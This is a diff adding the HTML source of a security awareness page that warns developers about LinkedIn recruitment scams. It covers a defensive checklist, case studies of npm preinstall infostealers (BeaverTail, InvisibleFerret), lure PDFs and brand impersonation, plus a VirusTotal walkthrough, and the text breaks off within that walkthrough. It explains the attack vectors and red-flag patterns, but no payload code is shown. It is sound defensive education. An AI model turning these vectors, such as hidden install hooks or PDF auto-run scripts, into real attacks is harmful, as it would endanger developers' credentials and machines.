@@ -1,0 +1,1093 @@
+<!DOCTYPE html>
+<html lang="en" class="scroll-smooth">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Security awareness portal documenting sophisticated LinkedIn recruitment scams targeting Web3 and fullstack developers." />
+  <title>🛡️ Dev Recruitment Safeguards — LinkedIn Scam Alerts</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      theme: {
+        extend: {
+          animation: { 'pulse-slow': 'pulse 3s cubic-bezier(0.4,0,0.6,1) infinite' }
+        }
+      }
+    }
+  </script>
+  <style>
+    body { background-color: #0a0f1e; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+    /* ── Tooltip ── */
+    .tt { position: relative; cursor: help; border-bottom: 1px dotted #64748b; }
+    .tt::after {
+      content: attr(data-tip);
+      position: absolute; bottom: calc(100% + 8px); left: 50%;
+      transform: translateX(-50%);
+      background: #1e293b; color: #f1f5f9;
+      padding: 8px 12px; border-radius: 8px;
+      font-size: 0.72rem; line-height: 1.45;
+      width: max-content; max-width: 260px; white-space: normal;
+      pointer-events: none; opacity: 0; transition: opacity 0.15s;
+      z-index: 200; border: 1px solid #334155;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.5);
+    }
+    .tt::before {
+      content: ''; position: absolute; bottom: calc(100% + 2px); left: 50%;
+      transform: translateX(-50%);
+      border: 6px solid transparent; border-top-color: #1e293b;
+      opacity: 0; transition: opacity 0.15s; z-index: 200; pointer-events: none;
+    }
+    .tt:hover::after, .tt:hover::before { opacity: 1; }
+
+    /* ── Card hover ── */
+    .case-card { transition: transform 0.2s, box-shadow 0.2s; }
+    .case-card:hover { transform: translateY(-4px); box-shadow: 0 20px 40px rgba(0,0,0,0.45); }
+
+    /* ── Threat badge pulse ── */
+    .pulse-red { animation: pulseRed 2s ease-in-out infinite; }
+    @keyframes pulseRed {
+      0%,100% { box-shadow: 0 0 0 0 rgba(239,68,68,0.4); }
+      50%      { box-shadow: 0 0 0 8px rgba(239,68,68,0); }
+    }
+
+    /* ── Grid bg ── */
+    .grid-bg {
+      background-image:
+        linear-gradient(rgba(30,41,59,0.25) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(30,41,59,0.25) 1px, transparent 1px);
+      background-size: 40px 40px;
+    }
+
+    /* ── Code ── */
+    .code-block { background:#0d1117; border:1px solid #30363d; border-radius:8px; font-family:'Fira Code','Cascadia Code',monospace; }
+
+    /* ── Scrollbar ── */
+    ::-webkit-scrollbar { width: 5px; }
+    ::-webkit-scrollbar-track { background: #0a0f1e; }
+    ::-webkit-scrollbar-thumb { background: #334155; border-radius: 3px; }
+
+    /* ── Modal scroll lock ── */
+    .modal-open { overflow: hidden; }
+  </style>
+</head>
+<body class="text-slate-200 min-h-screen">
+
+<!-- ═══════════════════════════════════════════
+     NAV
+═══════════════════════════════════════════ -->
+<nav class="sticky top-0 z-50 bg-slate-900/95 backdrop-blur border-b border-slate-800">
+  <div class="max-w-6xl mx-auto px-4 py-3 flex items-center justify-between">
+    <div class="flex items-center gap-2">
+      <span class="text-xl">🛡️</span>
+      <span class="font-bold text-white text-sm md:text-base">Dev Recruitment Safeguards</span>
+    </div>
+    <div class="hidden md:flex items-center gap-6 text-sm text-slate-400">
+      <a href="#checklist"    class="hover:text-amber-400  transition-colors">Checklist</a>
+      <a href="#case-studies" class="hover:text-red-400    transition-colors">Case Studies</a>
+      <a href="#virustotal"   class="hover:text-cyan-400   transition-colors">VirusTotal</a>
+      <a href="#defense"      class="hover:text-emerald-400 transition-colors">Defense</a>
+    </div>
+    <a href="https://github.com/drasticstatic/dev-recruitment-safeguards" target="_blank" rel="noopener"
+       class="text-xs bg-slate-800 hover:bg-slate-700 px-3 py-1.5 rounded-full text-slate-300 transition-colors border border-slate-700">
+      ⭐ GitHub
+    </a>
+  </div>
+</nav>
+
+<!-- ═══════════════════════════════════════════
+     HERO
+═══════════════════════════════════════════ -->
+<section class="relative overflow-hidden grid-bg" style="background-color:#0a0f1e;">
+  <div class="absolute inset-0 pointer-events-none" style="background:radial-gradient(ellipse at 50% 0%, rgba(239,68,68,0.12) 0%, transparent 65%);"></div>
+  <div class="relative max-w-6xl mx-auto px-4 py-20 md:py-32 text-center">
+
+    <div class="inline-flex items-center gap-2 bg-red-950/50 border border-red-800/50 text-red-400 text-xs px-3 py-1.5 rounded-full mb-6">
+      <span class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></span>
+      ACTIVE THREAT — LinkedIn Recruitment Scams Targeting Developers
+    </div>
+
+    <h1 class="text-4xl md:text-6xl font-black text-white mb-4 leading-tight">
+      Dev Recruitment<br>
+      <span class="text-transparent bg-clip-text bg-gradient-to-r from-red-400 to-amber-400">Safeguards</span>
+    </h1>
+    <p class="text-slate-400 text-lg md:text-xl max-w-2xl mx-auto mb-10">
+      Real-world documentation of sophisticated "long-con" recruitment scams targeting
+      <strong class="text-slate-200">Web3 &amp; fullstack developers</strong> on LinkedIn.
+      Three confirmed attack vectors. Three real personas.
+    </p>
+
+    <div class="flex flex-wrap justify-center gap-4 mb-10">
+      <div class="bg-slate-800/60 border border-slate-700 rounded-xl px-5 py-3 text-center">
+        <div class="text-2xl font-black text-red-400">3</div>
+        <div class="text-xs text-slate-400 mt-0.5">Attack Vectors</div>
+      </div>
+      <div class="bg-slate-800/60 border border-slate-700 rounded-xl px-5 py-3 text-center">
+        <div class="text-2xl font-black text-amber-400">0/70</div>
+        <div class="text-xs text-slate-400 mt-0.5">VT Score ≠ Safe</div>
+      </div>
+      <div class="bg-slate-800/60 border border-slate-700 rounded-xl px-5 py-3 text-center">
+        <div class="text-2xl font-black text-emerald-400">100%</div>
+        <div class="text-xs text-slate-400 mt-0.5">Documented &amp; Vetted</div>
+      </div>
+      <div class="bg-slate-800/60 border border-slate-700 rounded-xl px-5 py-3 text-center">
+        <div class="text-2xl font-black text-cyan-400">2</div>
+        <div class="text-xs text-slate-400 mt-0.5">Malware Families</div>
+      </div>
+    </div>
+
+    <div class="flex flex-wrap justify-center gap-3">
+      <a href="#checklist"    class="bg-emerald-600 hover:bg-emerald-500 text-white font-semibold px-6 py-3 rounded-xl transition-colors">🛡️ View Checklist</a>
+      <a href="#case-studies" class="bg-slate-700   hover:bg-slate-600   text-white font-semibold px-6 py-3 rounded-xl transition-colors">🔍 Case Studies</a>
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     SECURITY CHECKLIST
+═══════════════════════════════════════════ -->
+<section id="checklist" class="max-w-6xl mx-auto px-4 py-16">
+  <div class="bg-gradient-to-br from-amber-950/40 to-slate-900 border border-amber-700/50 rounded-2xl p-6 md:p-8">
+
+    <div class="flex flex-col md:flex-row md:items-center justify-between gap-4 mb-6">
+      <div>
+        <div class="flex items-center gap-3 mb-1">
+          <span class="text-3xl">⚠️</span>
+          <h2 class="text-2xl font-bold text-amber-300">Security Checklist</h2>
+        </div>
+        <p class="text-slate-400 text-sm">Run this before responding to ANY unsolicited recruiter message</p>
+      </div>
+      <button id="copyBtn" onclick="copyChecklist()"
+        class="flex items-center gap-2 bg-amber-600 hover:bg-amber-500 text-white font-semibold px-5 py-2.5 rounded-xl transition-all text-sm whitespace-nowrap">
+        📋 Copy to Clipboard
+      </button>
+    </div>
+
+    <div class="grid md:grid-cols-2 gap-3">
+
+      <div class="flex items-start gap-3 bg-slate-900/50 rounded-xl p-4 border border-slate-700/50">
+        <span class="text-xl flex-shrink-0 mt-0.5">🔍</span>
+        <div>
+          <div class="font-semibold text-white text-sm mb-1">Scan First</div>
+          <div class="text-slate-400 text-xs leading-relaxed">
+            Upload any file or URL to
+            <span class="tt text-cyan-400" data-tip="Upload at virustotal.com — critically, check the 'Behavior' tab, not just the score. A 0/70 score only means it's unknown to existing signatures, not that it's safe.">VirusTotal.com</span>.
+            Check the
+            <span class="tt text-amber-300" data-tip="The Behavior tab shows what a file ACTUALLY DID when run in a sandbox — network calls, dropped files, shell commands. A clean score with suspicious behavior is a live threat.">Behavior tab</span>
+            for
+            <span class="tt text-red-400" data-tip="/OpenAction executes JavaScript the moment you open a PDF — before you've read a single word. Used to silently download malware or steal clipboard data.">/OpenAction</span>
+            or
+            <span class="tt text-red-400" data-tip="JavaScript embedded in PDFs. Can trigger downloads, keyloggers, or system fingerprinting on open. Should never appear in a simple spec document.">/JS</span>
+            flags.
+          </div>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-3 bg-slate-900/50 rounded-xl p-4 border border-slate-700/50">
+        <span class="text-xl flex-shrink-0 mt-0.5">🕵️</span>
+        <div>
+          <div class="font-semibold text-white text-sm mb-1">Verify Identity</div>
+          <div class="text-slate-400 text-xs leading-relaxed">
+            Check the LinkedIn
+            <span class="tt text-cyan-400" data-tip="The Activity tab shows posts, likes, and comments. If a '500+ connections' account has zero activity for 2+ years then suddenly DMs you a job offer, it's a hijacked or purchased dormant account.">"Activity" tab</span>.
+            Dormant accounts with sudden DMs = 🚩.
+            Cross-reference on
+            <span class="tt text-cyan-400" data-tip="Scammers rarely control all of a victim's social accounts simultaneously. Message them on Twitter/X or Discord to confirm they actually sent the LinkedIn message.">Twitter/X or Discord</span>.
+          </div>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-3 bg-slate-900/50 rounded-xl p-4 border border-slate-700/50">
+        <span class="text-xl flex-shrink-0 mt-0.5">📦</span>
+        <div>
+          <div class="font-semibold text-white text-sm mb-1">Sandbox First — Always</div>
+          <div class="text-slate-400 text-xs leading-relaxed">
+            Use
+            <span class="tt text-emerald-400" data-tip="Apple Preview has zero JavaScript support. /OpenAction and /JS scripts simply don't run. Neutralizes the most common PDF attack vector instantly.">Apple Preview</span>
+            (not Adobe) for PDFs. Run code tests in
+            <span class="tt text-emerald-400" data-tip="A Docker container with no --env flags and no host volume mounts has zero access to your .env files, SSH keys, or AWS credentials. Nuke it after the test.">Docker</span>
+            or a
+            <span class="tt text-emerald-400" data-tip="GitHub Codespaces = a fresh browser-based environment with no access to your local machine. Free tier available. Perfect for untrusted code tests.">disposable VM / Codespaces</span>
+            with <strong>no access</strong> to your host credentials.
+          </div>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-3 bg-slate-900/50 rounded-xl p-4 border border-slate-700/50">
+        <span class="text-xl flex-shrink-0 mt-0.5">📞</span>
+        <div>
+          <div class="font-semibold text-white text-sm mb-1">Demand a Video Call</div>
+          <div class="text-slate-400 text-xs leading-relaxed">
+            Before cloning anything, request a 15-min video.
+            <span class="tt text-amber-300" data-tip="Bots and scam operations maintain convincing text personas, but showing a real face on video is hard to fake at scale. Most malicious actors ghost or make camera excuses rather than risk exposure.">Most malicious actors won't show up</span>.
+            Say directly: "I receive a lot of scam messages and need to verify you're real." A genuine recruiter will understand.
+          </div>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-3 bg-slate-900/50 rounded-xl p-4 border border-slate-700/50">
+        <span class="text-xl flex-shrink-0 mt-0.5">📄</span>
+        <div>
+          <div class="font-semibold text-white text-sm mb-1">Audit package.json</div>
+          <div class="text-slate-400 text-xs leading-relaxed">
+            Before any npm command, open
+            <span class="tt text-cyan-400" data-tip="The 'scripts' section can define preinstall/postinstall hooks that execute automatically with npm install — before you see any code. Malware hides here as obfuscated base64 strings.">package.json manually</span>.
+            Look for
+            <span class="tt text-red-400" data-tip="Base64 strings in npm scripts are a major red flag. Decode them — legitimate packages never need to hide their scripts. Real packages don't fetch code from external URLs at install time.">base64 strings</span>
+            or external URL calls in
+            <span class="tt text-red-400" data-tip="preinstall runs before any package downloads. postinstall runs after. Both execute with your full system permissions and can immediately steal credentials without running a line of 'your' code.">preinstall/postinstall</span>
+            hooks.
+          </div>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-3 bg-slate-900/50 rounded-xl p-4 border border-slate-700/50">
+        <span class="text-xl flex-shrink-0 mt-0.5">🔗</span>
+        <div>
+          <div class="font-semibold text-white text-sm mb-1">Verify the Domain</div>
+          <div class="text-slate-400 text-xs leading-relaxed">
+            Check the recruiter's email domain carefully.
+            <span class="tt text-red-400" data-tip="Scammers register domains like 'kurulabs-jobs.com' or 'kuru-labs.org' — visually similar to legitimate companies. Always verify against the company's official social media.">Lookalike domains</span>
+            are common (e.g. <code class="text-red-400 bg-slate-800 px-1 rounded">kurulabs.org</code> vs the real domain).
+            Verify via official
+            <span class="tt text-cyan-400" data-tip="The company's Twitter/X or GitHub will link to their real domain. If the recruiter's domain doesn't match, it's a spoofed identity.">social media</span>.
+          </div>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-3 bg-slate-900/50 rounded-xl p-4 border border-slate-700/50">
+        <span class="text-xl flex-shrink-0 mt-0.5">🔁</span>
+        <div>
+          <div class="font-semibold text-white text-sm mb-1">Cross-Reference the Company</div>
+          <div class="text-slate-400 text-xs leading-relaxed">
+            Search the company on
+            <span class="tt text-cyan-400" data-tip="Scam operations often only exist in the PDFs they send — no organic web presence, no news mentions, no real employee posts. If you can't find independent confirmation, it doesn't exist.">Google and LinkedIn separately</span>.
+            If the project <em>only</em> exists in the PDF they sent you —
+            <span class="tt text-red-400" data-tip="A legitimate funded startup will have: a Twitter/X account, a GitHub org, blog posts, or news mentions. Absence of all of these is a definitive red flag.">it's a scam</span>.
+          </div>
+        </div>
+      </div>
+
+      <div class="flex items-start gap-3 bg-slate-900/50 rounded-xl p-4 border border-slate-700/50">
+        <span class="text-xl flex-shrink-0 mt-0.5">🛡️</span>
+        <div>
+          <div class="font-semibold text-white text-sm mb-1">Confirm via Official Channels</div>
+          <div class="text-slate-400 text-xs leading-relaxed">
+            Before any technical work, post in the
+            <span class="tt text-emerald-400" data-tip="Ask in the company's official Discord: 'Is [recruiter name] from [company] an authorized hiring partner?' You'll get an immediate answer — scammers can't intercept community channels.">company's Discord or Twitter/X</span>
+            to confirm the recruiter is verified.
+            <span class="tt text-amber-300" data-tip="A legitimate company wants great hires and will not be offended by you verifying their recruiter's identity. This is professional due diligence.">Real recruiters welcome this</span>.
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <div class="mt-4 p-3 bg-red-950/30 border border-red-800/30 rounded-xl text-xs text-slate-400">
+      💡 <strong class="text-amber-300">Remember:</strong>
+      A <span class="tt text-amber-300" data-tip="VirusTotal aggregates 70+ security vendor signatures. A 0/70 score means no known signature matches — not that it's safe. Novel malware (like fresh BeaverTail variants) won't be in any database yet. The Behavior tab runs the file live in a sandbox.">"0/70" score means unknown, not safe</span>.
+      Always check the <strong class="text-amber-300">Behavior tab</strong> for network calls, dropped files, and shell commands.
+    </div>
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     CASE STUDIES
+═══════════════════════════════════════════ -->
+<section id="case-studies" class="max-w-6xl mx-auto px-4 pb-16">
+  <div class="text-center mb-12">
+    <h2 class="text-3xl md:text-4xl font-black text-white mb-3">📂 Confirmed Case Studies</h2>
+    <p class="text-slate-400 text-sm">Three real attack campaigns — documented from first contact to full analysis. Click <strong class="text-cyan-400">Deep Dive</strong> for technical details.</p>
+  </div>
+
+  <div class="grid lg:grid-cols-3 gap-6">
+
+    <!-- ── Case 1: Repo Trap ── -->
+    <div class="case-card bg-slate-900 border border-red-900/50 rounded-2xl overflow-hidden flex flex-col">
+      <div class="bg-gradient-to-r from-red-950 to-slate-900 p-5 border-b border-red-900/30">
+        <div class="flex items-center justify-between mb-3">
+          <span class="bg-red-600 text-white text-xs font-bold px-2.5 py-1 rounded-full pulse-red">🔴 CRITICAL</span>
+          <span class="text-slate-500 text-xs">Case #1</span>
+        </div>
+        <h3 class="text-xl font-black text-white mb-1">🪤 The Repo Trap</h3>
+        <p class="text-slate-400 text-sm">"Contagious Interview" — npm preinstall malware</p>
+      </div>
+      <div class="p-5 flex flex-col flex-1">
+        <div class="space-y-2.5 mb-5 flex-1 text-sm">
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Persona</span>
+            <span class="text-red-300 font-medium">"Jacinta Stewart"</span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Vector</span>
+            <span class="text-slate-300"><span class="tt" data-tip="preinstall scripts run before npm downloads any packages. Malware executes with your full user permissions the instant you type 'npm install' — before you can inspect a single dependency.">npm preinstall</span> in cloned repo</span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Payload</span>
+            <span class="text-slate-300">
+              <span class="tt text-amber-300" data-tip="BeaverTail is a JavaScript infostealer targeting developer credentials: AWS keys, SSH keys, .env files, browser cookies, and crypto wallets. First observed 2023 targeting Web3 devs via LinkedIn.">BeaverTail</span>
+              /
+              <span class="tt text-amber-300" data-tip="InvisibleFerret is a Python-based Remote Access Trojan deployed as a second stage by BeaverTail. It gives attackers persistent remote control of your machine.">InvisibleFerret RAT</span>
+            </span>
+          </div>
+          <div class="flex gap-2 items-center">
+            <span class="text-slate-500 w-16 flex-shrink-0">Repo</span>
+            <code class="text-cyan-400 text-xs bg-slate-800 px-1.5 py-0.5 rounded">staufenbiel89/dtm</code>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Mimics</span>
+            <span class="tt text-slate-300 text-xs" data-tip="dtm-labs/dtm is a real distributed transaction manager with 10,000+ GitHub stars. The scam repo uses the same short name to appear legitimate in a quick search.">dtm-labs/dtm ★10k+</span>
+          </div>
+          <div class="mt-2">
+            <div class="text-xs text-slate-500 font-semibold mb-2 uppercase tracking-wide">What Gets Stolen:</div>
+            <div class="flex flex-wrap gap-1.5">
+              <span class="text-xs bg-red-950/60 border border-red-800/40 text-red-300 px-2 py-0.5 rounded-full">AWS/GCP Keys</span>
+              <span class="text-xs bg-red-950/60 border border-red-800/40 text-red-300 px-2 py-0.5 rounded-full">SSH Keys</span>
+              <span class="text-xs bg-red-950/60 border border-red-800/40 text-red-300 px-2 py-0.5 rounded-full">.env Files</span>
+              <span class="text-xs bg-red-950/60 border border-red-800/40 text-red-300 px-2 py-0.5 rounded-full">Browser Cookies</span>
+              <span class="text-xs bg-red-950/60 border border-red-800/40 text-red-300 px-2 py-0.5 rounded-full">Crypto Wallets</span>
+            </div>
+          </div>
+        </div>
+        <button onclick="openModal('modal-repo-trap')"
+          class="w-full bg-red-800/30 hover:bg-red-700/40 border border-red-700/50 text-red-300 text-sm font-semibold py-2.5 rounded-xl transition-colors">
+          🔬 Deep Dive + Screenshots
+        </button>
+      </div>
+    </div>
+
+    <!-- ── Case 2: The Lure ── -->
+    <div class="case-card bg-slate-900 border border-amber-900/50 rounded-2xl overflow-hidden flex flex-col">
+      <div class="bg-gradient-to-r from-amber-950 to-slate-900 p-5 border-b border-amber-900/30">
+        <div class="flex items-center justify-between mb-3">
+          <span class="bg-amber-600 text-white text-xs font-bold px-2.5 py-1 rounded-full">🟠 HIGH</span>
+          <span class="text-slate-500 text-xs">Case #2</span>
+        </div>
+        <h3 class="text-xl font-black text-white mb-1">🎣 The Lure</h3>
+        <p class="text-slate-400 text-sm">Professional PDF + secondary malicious coding task</p>
+      </div>
+      <div class="p-5 flex flex-col flex-1">
+        <div class="space-y-2.5 mb-5 flex-1 text-sm">
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Persona</span>
+            <span class="text-amber-300 font-medium">"Josépha Russe"</span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Vector</span>
+            <span class="text-slate-300 text-xs">
+              12-page
+              <span class="tt" data-tip="The APOM-DAPP document is a 12-page spec with DeFi architecture, EVM smart contracts, tokenomics, and a 12–18 month roadmap. Indistinguishable from a real Series A startup pitch.">DeFi spec PDF</span>
+              → trust-building → malicious coding task
+            </span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">PDF risk</span>
+            <span class="text-slate-300 text-xs">
+              <span class="tt text-red-400" data-tip="PDFs support JavaScript via Adobe Acrobat. An /OpenAction script executes automatically when the file opens — before you've read a single word. Can silently download and run malware.">/OpenAction</span>
+              triggers on open
+            </span>
+          </div>
+          <div class="flex gap-2 items-center">
+            <span class="text-slate-500 w-16 flex-shrink-0">VT Score</span>
+            <span class="text-emerald-400 font-mono font-bold">0/70</span>
+            <span class="tt text-amber-300 text-xs ml-1" data-tip="0/70 means no known signature matches — not that it's safe. Novel malware is designed to evade all signature detection. The Behavior tab is the real analysis.">← what this means ⚠️</span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Stage 2</span>
+            <span class="text-slate-300 text-xs">"Coding task" = malicious GitHub repo (same playbook as Case #1)</span>
+          </div>
+          <div class="mt-2 p-3 bg-amber-950/30 border border-amber-800/30 rounded-xl">
+            <div class="text-xs text-amber-300 font-semibold mb-1">📧 Confirmed fraudulent:</div>
+            <div class="text-xs text-slate-400 italic">"The coding assignment you received was fraudulent — please do not run it"</div>
+          </div>
+        </div>
+        <button onclick="openModal('modal-lure')"
+          class="w-full bg-amber-800/30 hover:bg-amber-700/40 border border-amber-700/50 text-amber-300 text-sm font-semibold py-2.5 rounded-xl transition-colors">
+          🔬 Deep Dive + Screenshots
+        </button>
+      </div>
+    </div>
+
+    <!-- ── Case 3: Impersonation ── -->
+    <div class="case-card bg-slate-900 border border-purple-900/50 rounded-2xl overflow-hidden flex flex-col">
+      <div class="bg-gradient-to-r from-purple-950 to-slate-900 p-5 border-b border-purple-900/30">
+        <div class="flex items-center justify-between mb-3">
+          <span class="bg-purple-600 text-white text-xs font-bold px-2.5 py-1 rounded-full">🟣 HIGH</span>
+          <span class="text-slate-500 text-xs">Case #3</span>
+        </div>
+        <h3 class="text-xl font-black text-white mb-1">🎭 The Impersonation</h3>
+        <p class="text-slate-400 text-sm">Brand hijacking of a legitimate Web3 project</p>
+      </div>
+      <div class="p-5 flex flex-col flex-1">
+        <div class="space-y-2.5 mb-5 flex-1 text-sm">
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Personas</span>
+            <span class="text-purple-300 font-medium text-xs">"Zam Villalon" + "Sujon Pramanik"</span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Targets</span>
+            <span class="text-slate-300 text-xs">
+              <span class="tt" data-tip="Kuru Labs is a legitimate decentralized exchange (DEX) on the Monad network with real seed funding. The scammers borrowed their brand and credibility to make outreach appear legitimate.">Kuru Labs / Monad</span>
+              (real funded project)
+            </span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Shell Co.</span>
+            <span class="text-slate-300 text-xs">
+              <span class="tt" data-tip="'Genusix Labs' claims to be a talent acquisition firm, but their registered address at 3826 O Ogilvie Ct, Woodbridge, VA 22192 is shared with medical diagnostic centers — not a Web3/tech hub.">Genusix Labs</span>
+              (VA — shares address with medical offices)
+            </span>
+          </div>
+          <div class="flex gap-2">
+            <span class="text-slate-500 w-16 flex-shrink-0">Pattern</span>
+            <span class="text-slate-300 text-xs">
+              <span class="tt" data-tip="The exact same message template was sent via email AND LinkedIn from two different 'people' at the same org. This copy-paste approach lets scammers target hundreds of devs simultaneously.">Identical scripted DMs</span>
+              across email + LinkedIn simultaneously
+            </span>
+          </div>
+          <div class="flex gap-2 items-center">
+            <span class="text-slate-500 w-16 flex-shrink-0">FOMO bait</span>
+            <span class="text-red-300 font-mono font-bold">$180k–$220k</span>
+            <span class="text-slate-400 text-xs">+ tokens</span>
+          </div>
+          <div class="mt-2 p-3 bg-purple-950/30 border border-purple-800/30 rounded-xl">
+            <div class="text-xs text-purple-300 font-semibold mb-1">🚩 Key red flag:</div>
+            <div class="text-xs text-slate-400">"Book a meeting with HR manager first" — pressure to use external Calendly before any verification</div>
+          </div>
+        </div>
+        <button onclick="openModal('modal-impersonation')"
+          class="w-full bg-purple-800/30 hover:bg-purple-700/40 border border-purple-700/50 text-purple-300 text-sm font-semibold py-2.5 rounded-xl transition-colors">
+          🔬 Deep Dive + Screenshots
+        </button>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ═══════════════════════════════════════════
+     VIRUSTOTAL SECTION
+═══════════════════════════════════════════ -->
+<section id="virustotal" class="max-w-6xl mx-auto px-4 pb-16">
+  <div class="bg-slate-900 border border-cyan-900/50 rounded-2xl overflow-hidden">
+
+    <div class="bg-gradient-to-r from-cyan-950/50 to-slate-900 p-6 border-b border-cyan-900/30">
+      <div class="flex flex-col md:flex-row md:items-center justify-between gap-3">
+        <div>
+          <h2 class="text-2xl font-black text-white mb-1">🧪 VirusTotal: Anatomy of a Lure PDF</h2>
+          <p class="text-slate-400 text-sm">APOM-DAPP Project Description —
+            <span class="tt text-emerald-400" data-tip="This specific file was fully vetted and confirmed safe before inclusion here. The VirusTotal report is shared as an educational example of what to look for — not as a safety certification.">vetted safe for analysis</span>
+          </p>
+        </div>
+        <button onclick="openModal('modal-virustotal')"
+          class="bg-cyan-800/30 hover:bg-cyan-700/40 border border-cyan-700/50 text-cyan-300 text-sm font-semibold px-4 py-2.5 rounded-xl transition-colors whitespace-nowrap">
+          📊 Full Threat Graph
+        </button>
+      </div>
+    </div>
+
+    <div class="p-6">
+      <div class="flex flex-col sm:flex-row gap-4 mb-6">
+        <div class="flex-1 bg-emerald-950/30 border border-emerald-800/30 rounded-xl p-4 text-center">
+          <div class="text-4xl font-black text-emerald-400 mb-1">0/70</div>
+          <div class="text-xs text-slate-400">Detections (main score)</div>
+        </div>
+        <div class="flex-1 bg-red-950/30 border border-red-800/30 rounded-xl p-4 flex items-center gap-3">
+          <span class="text-3xl flex-shrink-0">⚠️</span>
+          <div>
+            <div class="text-red-300 font-bold text-sm">But check the Behavior tab!</div>
+            <div class="text-xs text-slate-400 mt-0.5">The main score is NOT a safety certificate. Novel malware won't match any existing signature.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="grid md:grid-cols-3 gap-4 mb-5">
+        <div class="bg-slate-800/50 border border-slate-700/50 rounded-xl p-4">
+          <div class="text-xs text-slate-500 font-semibold uppercase tracking-wider mb-3">🌐 Contacted Domains</div>
+          <div class="space-y-2">
+            <div class="flex items-center gap-2">
+              <span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span>
+              <code class="text-xs text-cyan-300">acroipm2.adobe.com</code>
+              <span class="text-xs text-emerald-400 ml-auto">✓</span>
+            </div>
+            <div class="flex items-center gap-2">
+              <span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span>
+              <code class="text-xs text-cyan-300">a1672.dscr.akamai.net</code>
+              <span class="text-xs text-emerald-400 ml-auto">✓</span>
+            </div>
+            <p class="text-xs text-slate-500 italic mt-2">Adobe Acrobat IPM &amp; CDN. Normal for a PDF opened in Acrobat.</p>
+          </div>
+        </div>
+
+        <div class="bg-slate-800/50 border border-slate-700/50 rounded-xl p-4">
+          <div class="text-xs text-slate-500 font-semibold uppercase tracking-wider mb-3">📡 Contacted IPs (6)</div>
+          <div class="space-y-1.5">
+            <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span><code class="text-xs text-cyan-300">8.8.8.8</code><span class="text-xs text-slate-500 ml-auto">Google DNS</span></div>
+            <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span><code class="text-xs text-cyan-300">52.5.13.197</code><span class="text-xs text-slate-500 ml-auto">AWS/Adobe</span></div>
+            <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span><code class="text-xs text-cyan-300">23.195.81.59/73</code><span class="text-xs text-slate-500 ml-auto">Akamai</span></div>
+            <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span><code class="text-xs text-cyan-300">184.29.30.201</code><span class="text-xs text-slate-500 ml-auto">Akamai</span></div>
+            <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span><code class="text-xs text-cyan-300">23.39.148.131</code><span class="text-xs text-slate-500 ml-auto">Akamai</span></div>
+          </div>
+          <p class="text-xs text-slate-500 italic mt-2">All US-based Adobe/Akamai infrastructure.</p>
+        </div>
+
+        <div class="bg-slate-800/50 border border-slate-700/50 rounded-xl p-4">
+          <div class="text-xs text-slate-500 font-semibold uppercase tracking-wider mb-3">📁 Dropped Files (13)</div>
+          <div class="space-y-2">
+            <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span><span class="text-xs text-slate-300">1 × .zip</span><span class="text-xs text-emerald-400 ml-auto">✓ Clean</span></div>
+            <div class="flex items-center gap-2"><span class="w-2 h-2 rounded-full bg-emerald-500 flex-shrink-0"></span><span class="text-xs text-slate-300">12 × cache files</span><span class="text-xs text-emerald-400 ml-auto">✓ Clean</span></div>
+            <p class="text-xs text-slate-500 italic mt-2">PDF reader temp/cache. No .exe, .dll, or .ps1.
+              <span class="tt text-amber-300" data-tip="In a malicious PDF, 'Dropped Files' would show .exe or .dll being written to temp directories — those are the actual malware payloads. Always inspect this section.">In a malicious file, look for .exe/.dll here ⚠️</span>
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <div class="bg-slate-800/30 border border-slate-700/30 rounded-xl p-4">
+        <div class="font-semibold text-white mb-1 text-sm">🎓 The Lesson</div>
+        <p class="text-slate-400 text-sm">This specific PDF contacted only Adobe's own servers — standard Acrobat behavior. In a malicious PDF, these same fields would show C2 server connections, dropped .exe files, and shell command execution.
+        <strong class="text-amber-300">Learn what normal looks like so you can spot abnormal.</strong>
